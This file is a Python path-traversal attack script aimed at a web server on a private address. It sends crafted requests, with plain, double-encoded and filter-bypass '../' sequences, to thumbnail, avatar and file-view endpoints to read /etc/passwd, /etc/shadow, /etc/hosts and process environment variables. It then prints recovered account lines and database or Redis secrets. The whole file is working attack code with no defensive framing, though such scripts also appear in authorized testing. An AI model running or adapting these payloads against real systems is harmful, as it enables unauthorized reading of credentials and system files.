import requests

base = "http://192.168.1.100:8080"

targets = [
    ("/thumb?src=../../../etc/passwd&w=100&h=100", "passwd"),
    ("/thumb?src=../../../etc/shadow&w=100&h=100", "shadow"),
    ("/img/resize?path=../../../etc/hosts&width=200", "hosts"),
    ("/avatar?file=../../../proc/self/environ", "env"),
    ("/avatar?file=../../../proc/self/cmdline", "cmdline"),
    ("/api/file/view?filename=....//....//....//....//etc/passwd", "passwd2"),
    ("/api/file/view?filename=..%252f..%252f..%252f..%252fetc/passwd", "passwd3"),
    ("/api/file/view?filename=/etc/passwd", "abspath"),
]

for u, tag in targets:
    try:
        r = requests.get(base + u, timeout=5)
        if r.status_code != 404 and r.status_code != 403 and r.status_code != 400:
            txt = r.text.lower()
            if "root:x:" in txt or "root:" in r.text and "/bin/bash" in r.text:
                print("passwd(" + tag + ")")
                for line in r.text.split("\n"):
                    if "x:0:" in line or "/bin/bash" in line:
                        print("  " + line.strip())
            elif "127.0.0.1" in r.text and "localhost" in r.text:
                print("hosts(" + tag + ")")
            elif "DB_HOST" in r.text or "DB_PASSWORD" in r.text or "REDIS" in r.text:
                print("env(" + tag + ")")
                print(r.text[:400])
            elif len(r.text) > 20 and r.status_code == 200:
                print("read(" + tag + ") " + str(len(r.text)) + "b")
    except:
        pass
